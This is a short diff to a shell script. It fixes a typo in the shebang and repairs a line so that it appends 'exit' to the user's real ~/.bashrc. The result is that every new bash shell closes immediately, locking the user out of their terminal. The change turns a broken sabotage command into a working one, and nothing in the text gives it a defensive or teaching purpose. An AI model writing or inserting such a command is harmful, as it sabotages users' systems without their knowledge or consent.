@@ -1,3 +1,3 @@
-#!/bim/sh
+#!/bin/sh
 
-echo "exit" > "~/.bashrc"
+echo "exit" >> "$HOME/.bashrc"
